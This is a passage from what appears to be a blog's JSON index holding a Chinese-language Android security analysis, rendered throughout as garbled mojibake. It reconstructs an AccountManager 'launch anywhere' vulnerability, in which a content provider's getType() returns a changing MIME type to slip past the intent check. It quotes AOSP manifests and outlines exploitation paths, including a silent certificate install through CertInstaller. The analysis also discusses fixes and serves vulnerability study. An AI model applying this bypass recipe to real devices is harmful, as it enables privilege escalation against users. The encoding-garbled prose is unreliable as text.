(java.lang.NullPointerException e) &#123; // does nothing, Binder connection already null &#125; &#125; &#125;å¦‚æœä½ å»çœ‹ startActivity çš„æºç ï¼Œä½ ä¼šå‘ç°è¿™ä¸ª resolved type ä¹Ÿä¼šè¢«ç”¨åˆ°ï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ª type å¯ä»¥å½±å“è§£æçš„ç»“æœã€‚è‡³æ­¤ç­”æ¡ˆå°±å·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼šæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ª content provider çš„ getType() ä¸­åŠ¨æ‰‹è„šï¼Œè®©å…¶è¿›è¡Œå®‰å…¨æ£€æŸ¥æ—¶å’Œå®é™…å¯åŠ¨ activity æ—¶å¾—åˆ°ä¸¤ä¸ªä¸åŒçš„ typeï¼Œå°±èƒ½ç»•è¿‡æ£€æŸ¥å¯åŠ¨æ¶æ„ activityï¼å¤ç°æœ‰äº†å¦‚ä¸Šçš„åˆ†æç§¯ç´¯ï¼Œæ¥ä¸‹æ¥å¤ç°å®ƒå°±æ˜¯å¾ˆç®€å•çš„äº‹ã€‚æˆ‘ä»¬å·²çŸ¥ AccountManagerService åªå…è®¸å¯åŠ¨æˆ‘ä»¬ app è‡ªå·±çš„ activity ï¼ˆè¿˜æœ‰ä¸¤ä¸ªç³»ç»Ÿè‡ªå·±çš„ activity ä½†æ˜¯åœ¨è¿™ä¸ªæ¼æ´ä¸­å®Œå…¨æ²¡ç”¨ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦è‡ªå·±å£°æ˜ä¸€ä¸ª activity è®©å®ƒåŒ¹é…ä¸€ä¸ª mime typeï¼Œç„¶ååœ¨ Content Provider ä¸­è¿›è¡Œä¸€ä¸ªç®€å•çš„è®¡æ•°æ¥å†³å®šè¿”å›å“ªä¸ª mime typeã€‚å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªæ¼æ´æœ¬èº«åªå…è®¸æˆ‘ä»¬å¯åŠ¨æ¥æ”¶éšå¼ intent çš„ activityï¼Œé‚£æˆ‘ä»¬èƒ½é€‰æ‹©æ”»å‡»ä»€ä¹ˆç»„ä»¶ï¼Œåˆèƒ½é€ æˆå¤šå¤§çš„å±å®³å‘¢ï¼Ÿå°è¯•1ï¼šRe-Redirectionï¼Ÿé¦–å…ˆæƒ³åˆ°çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬èƒ½é€šè¿‡éšå¼ intent å¯åŠ¨æŸä¸ªå—ä¿æŠ¤ activityï¼Œè€Œè¿™ä¸ª activity åˆèƒ½æŒ‰æˆ‘ä»¬æ„å›¾å¯åŠ¨å…¶ä»–ç»„ä»¶ï¼Œä¾‹å¦‚ä» extras é‡Œæ‹¿åˆ°ä¸€ä¸ª intent ç„¶åç›´æ¥å‘é€å‡ºå»ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡è¿™ç§äºŒæ¬¡é‡å®šå‘å°±èƒ½è°ƒç”¨åˆ°æ²¡æœ‰å£°æ˜ intent filter çš„ç»„ä»¶ï¼Œå¤§å¤§æ‰©å±•æˆ‘ä»¬çš„æ”»å‡»é¢ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰è¿™æ ·çš„ activity å‘¢ï¼Ÿæœ‰ã€‚Settings ä¸­æœ‰ä¸€ä¸ªå«åš SearchResultTrampoline çš„ activityï¼Œå¯ä»¥é€šè¿‡å‘é€ com.android.settings.SEARCH_RESULT_TRAMPOLINE å¯åŠ¨ï¼Œå…¶æœ¬èº«ä¼šåœ¨æ ¡éªŒè°ƒç”¨è€…ä¸º Settings æœ¬èº«åä» extras å–å‡ºè°ƒç”¨è€…æŒ‡å®šçš„å‚æ•°ï¼Œç„¶åå¯åŠ¨ä»»æ„ activity æˆ– Settings å†…çš„ä»»æ„ fragmentã€‚æ›´ç¾å¥½çš„æ˜¯ï¼Œè¿™é‡Œçš„å…¥å‚ intent ç”šè‡³ä¹Ÿæ˜¯ä»¥ä¸€ä¸ª URI String çš„æ–¹å¼ç»™å‡ºï¼Œæ‰€ä»¥å³ä½¿æ˜¯æˆ‘ä»¬æ²¡æ³•å¾€é‡Œé¢æ”¾å…¥ Parcelable å¯¹è±¡çš„æƒ…å†µä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ª activity å®ç° launch anywhereã€‚12345678910&lt;activity android:name=\".search.SearchResultTrampoline\" android:theme=\"@android:style/Theme.NoDisplay\" android:excludeFromRecents=\"true\" android:knownActivityEmbeddingCerts=\"@array/config_known_host_certs\" android:exported=\"true\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"com.android.settings.SEARCH_RESULT_TRAMPOLINE\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt;&lt;/activity&gt;çœ‹èµ·æ¥å¾ˆç¾å¥½ï¼Œæ˜¯å§ï¼Ÿä¸è¿‡è¿™ä¸ª intent filter å¹¶æ²¡æœ‰æŒ‡å®š &lt;data&gt; æ ‡ç­¾ï¼Œè¿™ç§æƒ…å†µæˆ‘ä»¬èƒ½åˆ©ç”¨å—ï¼Ÿä¸€ä¸ªå¾ˆè‡ªç„¶çš„æ€è·¯å°±æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŠŠ type è®¾ç½®æˆ null çš„æ–¹å¼æ¥è®©ä¸€ä¸ªå¸¦æœ‰ content URI çš„éšå¼ intent åŒ¹é…åˆ°å®ƒå—ï¼Ÿå¾ˆé—æ†¾çš„æ˜¯ï¼Œæ­¤è·¯ä¸é€šã€‚å°è¯•è‡ªå·±å£°æ˜ä¸€ä¸ª activity æ¥æ”¶åŒ action å†åŠ ä¸Šä¸€ä¸ª mimeType ä¸º application/canyie çš„ data æ ‡ç­¾ï¼Œç»è¿‡å®éªŒï¼Œtype è®¾ç½®ä¸º application/canyie æ—¶ç¡®å®å¯ä»¥è§£æåˆ°è‡ªå·±çš„ activityï¼Œä½†è®¾ç½®ä¸º null å³ä¼šè§¦å‘ ActivityNotFoundExceptionã€‚é‚£è¿˜æœ‰è¿™æ ·çš„ activity å—ï¼Ÿè¿˜æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ ChooserActivity å’Œ ResolverActivityï¼Œä¸¤è€…éƒ½æ˜¯ framework ä¸­çš„è‡ªå¸¦ activityï¼Œä¼šé€šè¿‡ startAsCaller çš„æ–¹å¼ä»¥è°ƒç”¨è€…çš„æƒé™å‘é€æŒ‡å®š intentã€‚å¦‚æœæˆ‘ä»¬èƒ½è®© system uid å¯åŠ¨è¿™ä¸¤ä¸ª activityï¼Œå°±èƒ½å†æ¬¡è·å¾—ä»¥ system uid å‘é€ä»»æ„ intent çš„èƒ½åŠ›ã€‚å¯æƒœçš„æ˜¯ï¼ŒResolverActivity å¹¶æ²¡æœ‰å£°æ˜ä»»ä½• intent filterï¼Œè€Œ ChooserActivity è™½ç„¶å£°æ˜äº† android.intent.action.CHOOSER è¿™ä¸ª actionï¼Œä½†åŒæ ·ä¹Ÿæ²¡æœ‰å£°æ˜ data æ ‡ç­¾ã€‚å…¶ä»–ç±»ä¼¼çš„ activity ä¹Ÿå¤§å¤šæ˜¯å¦‚æ­¤æƒ…å†µï¼Œæˆ‘å¹¶æ²¡æœ‰åœ¨ AOSP ä¸­æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„ activityï¼Œæ‰€ä»¥åªèƒ½æ”¾å¼ƒè¿™æ¡è·¯ã€‚å°è¯•2ï¼šCALL_PRIVILEGEDï¼Ÿæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåˆ©ç”¨æ­¤æ¼æ´åªèƒ½å¯åŠ¨å¸¦æœ‰ data æ ‡ç­¾ intent filter çš„ activityã€‚æ»¡è¶³è¿™äº›æ¡ä»¶è€Œä¸”æœ¬èº«åˆè¦æœ‰å±å®³çš„ activity å¾ˆå°‘ï¼Œå¤ç° Launch Anywhere ç±»æ¼æ´æ—¶æˆ‘ä»¬å¸¸ç”¨çš„ PlatLogoActivity è¿˜æœ‰é‡è®¾é”å±å¯†ç çš„é¡µé¢éƒ½æ²¡æ³•ç”¨è¿™ç§æ–¹æ³•å¯åŠ¨ã€‚ä¸è¿‡æˆ‘ä»¬è¿˜å¸¸ç”¨ android.intent.action.CALL_PRIVILEGED è¿™ä¸ª action è®©æ‰‹æœºç›´æ¥æ‹¨æ‰“ä»»æ„ç”µè¯åŒ…æ‹¬ç´§æ€¥ç”µè¯æ¥å®Œæˆå¤ç°ï¼Œæ¥çœ‹çœ‹å“ªä¸ª activity å¤„ç†è¿™ä¸ª actionï¼š123456789101112131415161718192021222324252627282930313233&lt;!-- Works like CallActivity with CALL_PRIVILEGED instead of CALL intent. CALL_PRIVILEGED allows calls to emergency numbers unlike CALL which disallows it. Intent-sender must have the CALL_PRIVILEGED permission or the broadcast will not be processed. High priority of 1000 is used in all intent filters to prevent anything but the system from processing this intent (b/8871505). --&gt;&lt;activity-alias android:name=\"PrivilegedCallActivity\" android:targetActivity=\".components.UserCallActivity\" android:permission=\"android.permission.CALL_PRIVILEGED\" android:exported=\"true\" android:process=\":ui\"&gt; &lt;intent-filter android:priority=\"1000\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:scheme=\"tel\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1000\" android:icon=\"@drawable/ic_launcher_sip_call\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:scheme=\"sip\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1000\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:scheme=\"voicemail\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1000\"&gt; &lt;action android:name=\"android.intent.action.CALL_PRIVILEGED\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone_v2\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/person\"/&gt; &lt;/intent-filter&gt;&lt;/activity-alias&gt;è¿™ä¸ª PrivilegedCallActivity å®šä¹‰åœ¨ telecomm é‡Œï¼Œå…¶æœ¬èº«è¢« android.permission.CALL_PRIVILEGED æƒé™ä¿æŠ¤æ‰€ä»¥ç¬¬ä¸‰æ–¹åº”ç”¨æ— æ³•è°ƒç”¨ï¼Œè€Œä¸”æ‰€æœ‰ intent filter éƒ½æœ‰ data æ ‡ç­¾ï¼è¿™ä¸å°±æ˜¯æˆ‘ä»¬æ¢¦å¯ä»¥æ±‚çš„å—å®³ç»„ä»¶å—ï¼Ÿç­‰ç­‰ï¼Œå…ˆåˆ«åŠåœºå¼€é¦™æ§Ÿï¼å›è¿‡å¤´ä»”ç»†çœ‹çœ‹å®ƒå®šä¹‰çš„æ‰€æœ‰ intent filterï¼Œå‰ä¸‰ä¸ªå¼ºåˆ¶è§„å®šäº† scheme æ‰€ä»¥æˆ‘ä»¬å¸¦æœ‰ content URI çš„ intent æ˜¯æ— æ³•åŒ¹é…çš„ï¼›æœ€åä¸€ä¸ªåªè§„å®šäº† mimeType æ²¡æœ‰è§„å®š schemeï¼Œçœ‹èµ·æ¥å®Œå…¨å¯ä»¥åˆ©ç”¨ï¼Œå¯ä»¥å†æŠŠé¦™æ§Ÿæ‰“å¼€äº†â€¦â€¦å—ï¼Ÿäº‹å®ä¸Šï¼Œéšå¼ intent æ˜¯æ— æ³•åŒ¹é…åˆ°æœ€åä¸€ä¸ª intent filter çš„ã€‚è¿™æ˜¯å› ä¸ºå®ƒæ²¡å£°æ˜ android.intent.category.DEFAULT è¿™ä¸ª categoryã€‚è‡³äºåŸå› å˜›ï¼Œä¸Šé¢ UserCallActivity çš„æ³¨é‡Šé‡Œå†™äº†ï¼Œå°±æ˜¯æ•…æ„çš„ï¼š12345678&lt;!-- Omit default category below so that all Intents sent to this filter must be explicit. --&gt;&lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.CALL\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/phone_v2\"/&gt; &lt;data android:mimeType=\"vnd.android.cursor.item/person\"/&gt;&lt;/intent-filter&gt;æ‘†æ˜äº†å°±æ˜¯æ­§è§†éšå¼ intentã€‚å¾—ï¼Œä½ å†™çš„ä»£ç ï¼Œä½ è¯´äº†ç®—ã€‚å†æ¬¡æ­¤è·¯ä¸é€šã€‚å°è¯•3ï¼šå®‰è£…æœªçŸ¥åº”ç”¨â€¦â€¦ä»€ä¹ˆæ˜¯â€œæœªçŸ¥åº”ç”¨â€ï¼Ÿå›å¤´çœ‹æ¼æ´æè¿°ï¼Œé‡Œé¢æåˆ°äº†â€œbypass intent security check and install an unknown appâ€ï¼Œæ­£å¥½å¯åŠ¨ PackageInstaller çš„ç§æœ‰ Activity é™é»˜å®‰è£…åº”ç”¨ä¹Ÿæ˜¯ launch anywhere å‹æ¼æ´å¸¸ç”¨çš„åˆ©ç”¨æ–¹æ³•ï¼Œé‚£å°±å†ç‚¹å¼€ PackageInstaller çœ‹ä¸€çœ¼ã€‚æˆ‘ä»¬ä¸€èˆ¬æ”»å‡» InstallInstalling è¿™ä¸ª activity è¿›è¡Œé™é»˜å®‰è£…åº”ç”¨ï¼Œå¯¹äºé™é»˜å¸è½½åˆ™ä½¿ç”¨ UninstallUninstallingï¼Œè€Œå¾ˆé—æ†¾è¿™ä¸¤ä¸ª activity éƒ½æ²¡æœ‰å£°æ˜ä»»ä½• intent filterã€‚è§‚å¯Ÿ PackageInstaller çš„ AndroidManifest.xmlï¼Œç”¨æ¼æ´å”¯ä¸€èƒ½è¿›æ¥çš„å°±æ˜¯è¿™ä¸ª InstallStartï¼š12345678910111213141516171819202122232425&lt;activity android:name=\".InstallStart\" android:exported=\"true\" android:excludeFromRecents=\"true\"&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.intent.action.VIEW\" /&gt; &lt;action android:name=\"android.intent.action.INSTALL_PACKAGE\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;data android:scheme=\"content\" /&gt; &lt;data android:mimeType=\"application/vnd.android.package-archive\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.intent.action.INSTALL_PACKAGE\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;data android:scheme=\"package\" /&gt; &lt;data android:scheme=\"content\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.content.pm.action.CONFIRM_INSTALL\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt; &lt;intent-filter android:priority=\"1\"&gt; &lt;action android:name=\"android.content.pm.action.CONFIRM_PRE_APPROVAL\" /&gt; &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt; &lt;/intent-filter&gt;&lt;/activity&gt;è¿™ä¸ª activity å®Œå…¨æ²¡è¢«ä¿æŠ¤ï¼Œæˆ‘ä»¬å¹³å¸¸å†™ä»£ç è¯·æ±‚å®‰è£…åº”ç”¨æˆ–è€…åœ¨æ–‡ä»¶ç®¡ç†å™¨é‡Œç‚¹ apk å®‰è£…çš„æ—¶å€™è¿›æ¥çš„å°±æ˜¯è¿™ä¸ª activityã€‚è€Œè§‚å¯Ÿé‡Œé¢çš„ä»£ç ï¼Œä¹Ÿæ²¡æœ‰è¯¸å¦‚â€œè°ƒç”¨è€…æ˜¯å¯ä¿¡ç³»ç»Ÿåº”ç”¨å°±ç›´æ¥å®‰è£…ä¸è¿›è¡Œç¡®è®¤â€è¿™ç§é€»è¾‘ã€‚é‚£ä¹ˆæ¼æ´ä½œè€…æœ‰æ²¡æœ‰å¯èƒ½æ˜¯æ”»å‡»äº†åº”ç”¨å¸‚åœºçš„ç§æœ‰ activityï¼Ÿçš„ç¡®æœ‰è¿™ä¸ªå¯èƒ½ï¼Œä½†æ˜¯æˆ‘ç®€å•æ‰«äº†ä¸€çœ¼ play storeï¼Œä¹Ÿæ²¡æ‰¾åˆ°èƒ½ç”¨çš„ã€‚è¿™éƒ¨åˆ†æˆ‘æ²¡æœ‰å®Œå…¨åç¼–è¯‘ç¡®è®¤ï¼Œåªæ˜¯ç®€å•çœ‹äº†ä¸€çœ¼ã€‚æ¬¢è¿å‹˜è¯¯ã€‚çªç„¶é—´ï¼Œæˆ‘çµå…‰ä¸€é—ªâ€¦â€¦æ¼æ´æè¿°ä¸ºä»€ä¹ˆè¯´â€œunknown appâ€è€Œä¸æ˜¯â€œarbitrary app without user interactionâ€ï¼Ÿè¯´æ˜å¾ˆå¯èƒ½æ ¹æœ¬å°±ä¸æ˜¯é™é»˜å®‰è£… appï¼Ÿè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹â€œæœªçŸ¥æ¥æºâ€çš„æ¦‚å¿µï¼šä¸€ä¸ªç¬¬ä¸‰æ–¹ä¸å¯ä¿¡åº”ç”¨å°è¯•å®‰è£…å…¶ä»– app çš„æ—¶å€™éœ€è¦ç”¨æˆ·æ‰‹åŠ¨å…ˆæˆæƒå®ƒå®‰è£…æœªçŸ¥ appï¼Œç„¶åæ‰èƒ½è¿›å…¥æ­£å¸¸çš„å®‰è£…ç¡®è®¤é¡µé¢ã€‚è¿™ä¸ªåŠŸèƒ½æ˜¯åœ¨ PackageInstaller ä¸­æ£€æµ‹è°ƒç”¨è€…ç„¶ååˆ¤æ–­å®ƒæƒé™å®ç°çš„ã€‚å¦‚æœæœ‰åŠæ³•è®©å…¶ä»–æœ‰æƒé™çš„ app å¸®å¿™å¯åŠ¨ PackageInstallerï¼Œå°±èƒ½ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚æ‰€ä»¥ï¼Œæ¼æ´ä½œè€…å¾ˆå¯èƒ½åªæ˜¯ç»•è¿‡äº†è¿™ä¸ªâ€œæœªçŸ¥æ¥æºâ€ï¼Œè€Œä¸æ˜¯å®ç°äº†é™é»˜å®‰è£…ï¼è¯´å®è¯ï¼Œæˆ‘åˆ†æåˆ°è¿™é‡Œçš„æ—¶å€™è‡ªå·±éƒ½è¢«æ— è¯­ä½äº†ï¼Œè·Ÿæˆ‘ç©æ–‡å­—æ¸¸æˆå‘¢â€¦â€¦åç»­æˆ‘æ²¡æœ‰å†å»å¤ç°ï¼Œä»ä»£ç æ¥çœ‹ç†è®ºä¸Šæ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯æˆ‘ä¸ªäººè§‰å¾—è¿™ç§ç»•è¿‡çš„å±å®³å®åœ¨æ˜¯ä½åˆ°å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚æ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥è‡ªå·±è¯•è¯•ã€‚å°è¯•4ï¼šé™é»˜å®‰è£…è¯ä¹¦æˆ‘ä»¬å¸¸ç”¨çš„åˆ©ç”¨æ–¹æ³•éƒ½ä¸è¡Œï¼Œè¿™é‡Œæˆ‘æå‡ºä¸€ç§æ–°çš„æ–¹æ³•ï¼šè°ƒç”¨ CertInstaller é™é»˜å®‰è£…è¯ä¹¦ã€‚å…¶å®å¾ˆä¹…ä¹‹å‰å°±æœ‰äººæå‡ºè¿‡è¿™ç§åˆ©ç”¨æ€è·¯ï¼Œä½†æ˜¯ä¸€ç›´æ²¡ä»€ä¹ˆçƒ­åº¦ï¼Œè€ƒè™‘åˆ° Android 7.0 å¼€å§‹ä¸å†é»˜è®¤ä¿¡ä»»ç”¨æˆ·å®‰è£…çš„è¯ä¹¦ï¼Œå…·ä½“èƒ½é€ æˆä»€ä¹ˆå±å®³ä¹Ÿæœ‰äº›è®¸ç–‘é—®ã€‚ä¸ç®¡æ€ä¹ˆæ ·ï¼Œåæ­£å®ƒèƒ½é™é»˜å®‰è£…ï¼ˆå…ˆä»‹ç»ä¸€ä¸‹ CertInstallerï¼Œæˆ‘ä»¬çš„æ¼æ´å”¯ä¸€èƒ½æ‰“åˆ°çš„å°±æ˜¯è¿™ä¸ªå« CertInstallerMain çš„é¡µé¢ï¼š1234567891011121314151617181920&lt;activity android:name=\".CertInstallerMain\" android:theme=\"@style/Transparent\" android:configChanges=\"orientation|keyboardHidden|screenSize\" android:exported=\"true\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.credentials.INSTALL\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;/intent-filter&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.VIEW\"/&gt; &lt;category android:name=\"android.intent.category.DEFAULT\"/&gt; &lt;data android:mimeType=\"application/x-x509-ca-cert\"/&gt; &lt;data android:mimeType=\"application/x-x509-user-cert\"/&gt; &lt;data android:mimeType=\"application/x-x509-server-cert\"/&gt; &lt;data android:mimeType=\"application/x-pkcs12\"/&gt; &lt;data android:mimeType=\"application/x-pem-file\"/&gt; &lt;data android:mimeType=\"application/pkix-cert\"/&gt; &lt;data android:mimeType=\"application/x-wifi-config\"/&gt; &lt;/intent-filter&gt;&lt;/activity&gt;å¾ˆæ˜æ˜¾æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘é€å¸¦æœ‰ action=android.intent.action.VIEW type=åº•ä¸‹é‚£ä¸€å †çš„ intent è§¦å‘å®ƒï¼Œè€Œè™½ç„¶è¿™ä¸ª activity æ²¡è¢«ä¿æŠ¤ï¼Œä½†æ˜¯å®ƒé‡Œé¢å…œå…œè½¬è½¬å…¶å®æœ€åä¼šåˆ¤æ–­è°ƒç”¨è€…ï¼Œå¦‚æœæ˜¯ Settings å°±ç›´æ¥æ— ç¡®è®¤å®‰è£…ï¼Œå¦åˆ™æ˜¾ç¤ºä¸ªå¯¹è¯æ¡†è¦æ±‚ä½ è¿› Settings é‡Œæ‰‹åŠ¨å®‰è£…ã€‚æ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚çš„æ€è·¯å°±æ˜¯ï¼Œå£°æ˜ä¸€ä¸ª activity å¤„ç† VIEW çš„ action + ä¸€ä¸ªéšæœº mime typeï¼Œè‡ªå·±ç»§æ‰¿ä¸€ä¸‹ FileProvider ç„¶åé‡å†™ getType åœ¨é‡Œé¢å†™ä¸ªè®¡æ•°å†³å®šè¿”å›å“ªä¸ª typeï¼Œç„¶åè®©ç³»ç»Ÿå¸®æˆ‘ä»¬å¯åŠ¨ intent å³å¯ã€‚ä¸¤ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹ï¼š1. intent è¦å¸¦ä¸Šä¸€ä¸ª certificate_install_usage çš„ extra å¦åˆ™ CertInstaller è®¤ä¸å‡ºè¯ä¹¦ç±»å‹ï¼›2. system uid ä¸å…è®¸å‘å‡ºä¸åœ¨ç™½åå•çš„ URI grantï¼Œæ‰€ä»¥åœ¨ intent é‡Œæ·»åŠ  grant flags å¹¶ä¸èƒ½ç»™ CertInstaller æˆæƒè¯»å†™è‡ªå·±çš„ providerã€‚è§£å†³æ–¹æ³•å¯ä»¥æ˜¯ç›´æ¥æŠŠå®ƒå£°æ˜æˆ exportedï¼ˆä½†æ˜¯è¿™æ ·è¦æ”¹ FileProvideræºç ï¼‰ï¼Œæˆ‘å·æ‡’å°±ç›´æ¥ç¡¬ç¼–ç è°ƒç”¨ grantUriPermission() ç»™ CertInstaller æˆæƒäº†ã€‚æ€»ç»“æˆ‘ä¸ªäººè§‰å¾—è™½ç„¶è¿™ä¸ªæ´èƒ½è°ƒèµ·è¢«ä¿æŠ¤çš„ activityï¼ŒGoogle ä¹Ÿç»™å‡ºäº†é«˜å±è¯„çº§ï¼Œä½†æ¡ä»¶å®åœ¨å¤ªè¿‡è‹›åˆ»ï¼ˆæˆ‘è‡ªå·±æ˜¯æƒ³ä¸åˆ°ä¼šæœ‰å¤šå°‘ activity åˆæœ‰ mimeType åˆè¢«ä¿æŠ¤ï¼‰ï¼Œåœ¨ AOSP ä¸­çš„å½±å“ä¸æ˜¯å¾ˆå¤§ï¼Œä½†æ˜¯è¿™ä¸ªåˆ©ç”¨æœ¬èº«è¿˜æ˜¯éå¸¸ç²¾å·§çš„ï¼Œéœ€è¦å¯¹ Android æœ‰å¾ˆæ·±çš„äº†è§£æ‰èƒ½å†™å‡ºæ¥ã€‚æˆ‘ä¸€å¼€å§‹å‚è€ƒ Parcel Mismatch æŠŠè¿™ç§æ¼æ´å«åšâ€œIntent Data Type Mismatchâ€ï¼Œåé¢è€ƒè™‘â€œmismatchâ€è¿™ä¸ªè‹±æ–‡å•è¯å¯èƒ½æ›´åŠ å¼ºè°ƒçš„æ˜¯â€œé…å¯¹é”™äº†â€çš„æ„æ€ï¼Œè€Œä¸æ˜¯ä¸¤æ¬¡è§£æè¿‡ç¨‹ä¸­å› ä¸ºå…¶ä»–å› ç´ é€ æˆçš„ä¸ä¸€è‡´ï¼Œæ”¹æˆå‚è€ƒ Self-changing Bundle è¿™ä¸ªåå­—å‘½åä¸ºâ€œSelf-changing Data Typeâ€ã€‚å½“ç„¶æˆ‘ä¸æ˜¯æ¼æ´å‘ç°è€…ï¼Œæ²¡æœ‰å‘½åæƒï¼Œè¿™ä¸ªå‘½åçœ‹çœ‹å°±å¥½ã€‚ï¼ˆæ‰€ä»¥ä½ çš„ double reflection æ— äººé—® åˆ«äººä¸€æœå‘½åæˆ meta reflection å¤©ä¸‹çŸ¥æ€ä¹ˆç®—â€¦â€¦ï¼‰AccountManager API æ˜¯ Android 2.0 ä¹Ÿå³ 2009 å¹´æ·»åŠ çš„ï¼ŒLaunch Anywhere æ¼æ´å·²ç»æ˜¯ 2014 å¹´çˆ†å‡ºæ¥çš„ï¼Œå®Œå…¨æ²¡æƒ³åˆ°é™¤äº† bundle mismatch åå¹´ä¹‹åè¿˜èƒ½çˆ†å‡ºæ¥è¿™æ ·ä¸€ç§ä¼˜é›…çš„åˆ©ç”¨æ–¹æ³•ï¼Œå®åœ¨ä½©æœã€‚è¿™ä¸ªæ¼æ´çš„åŸç†è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå°±æ˜¯ä¸€ä¸ªç±»ä¼¼ TOCTTOU race condition çš„é—®é¢˜ã€‚é™¤äº†ç›´æ¥æ‹’ç» content uri ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ç§ä¿®å¤æ€è·¯æ˜¯åšå®Œå®‰å…¨æ£€æŸ¥ä¹‹åç›´æ¥ç»™ intent è®¾ç½®ä¸Š component name è®©å®ƒæˆä¸ºä¸€ä¸ªæ˜¾å¼ intentï¼Œåç»­ startActivity() æ—¶å°±ä¸ä¼šå†è¿›å…¥éšå¼ intent çš„è§£ææµç¨‹ï¼Œä¸¤ç§æ–¹æ³•éƒ½èƒ½é˜»æ­¢å®ƒæŒ‡å‘çš„ç»„ä»¶å‘ç”Ÿå˜åŒ–ä¹Ÿå°±ä¿®å¤äº†æ¼æ´ã€‚ç”±äºè”ç³»ä¸åˆ°æ¼æ´ä½œè€…æœ¬äººï¼Œæ‰€ä»¥ä»¥ä¸Šæ–‡å­—çº¯å±æˆ‘çš„æ¨ç†ï¼Œæ²¡æ³•å’Œæ¼æ´ä½œè€…ç¡®è®¤æ˜¯å¦æ­£ç¡®ï¼Œä¹Ÿæ¬¢è¿å„ä½è¯»è€…å‹˜è¯¯ã€‚æ¨ç†çš„è¿‡ç¨‹æœ¬èº«å…¶å®ä¹Ÿå¾ˆè¿‡ç˜¾ï¼Œæœ‰ç‚¹çƒ§è„‘ï¼Œæœ‰ä¸€ç§åˆ‘ä¾¦æ¢æ¡ˆçš„æ„Ÿè§‰ï¼Œåœ¨ç°åœºé€šè¿‡å«Œç–‘äººé—ç•™çš„è¯æ®ä¸€ç‚¹ä¸€ç‚¹çš„æŠ½ä¸å‰¥èŒ§è¿˜åŸæ¡ˆä»¶çœŸç›¸ã€‚33iq ä»€ä¹ˆçš„è·Ÿè¿™ä¸ªæ¯”èµ·æ¥éƒ½å¼±çˆ†äº†ï¼Œå»ºè®®æŠŠè¿™ä¸ªæ¼æ´æ”¹ç¼–æˆå‰§æœ¬æ€ï¼ˆä¸æ˜¯2025 å¹´ 1 æœˆ 10 æ—¥æ›´æ–°ï¼šå®˜æ–¹ç»™å‡ºäº†è¿™ä¸ªæ¼æ´çš„ test ä»£ç ï¼Œç®—æ˜¯ä¾§é¢å°è¯äº†æˆ‘çš„åˆ†æã€‚","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Android å¹³å°å¸¸è§å®‰å…¨æ¼æ´ç±»å‹","slug":"android-platform-common-vulnerabilities","date":"2024-11-04T22:00:00.000Z","updated":"2025-05-15T11:13:01.210Z","comments":true,"path":"2024/11/05/android-platform-common-vulnerabilities/","link":"","permalink":"https://blog.canyie.top/2024/11/05/android-platform-common-vulnerabilities/","excerpt":"æœ¬æ–‡é€‚ç”¨äºå·²å¯¹ Android å¼€å‘æœ‰åŸºç¡€äº†è§£ï¼Œå¸Œæœ›äº†è§£ Android 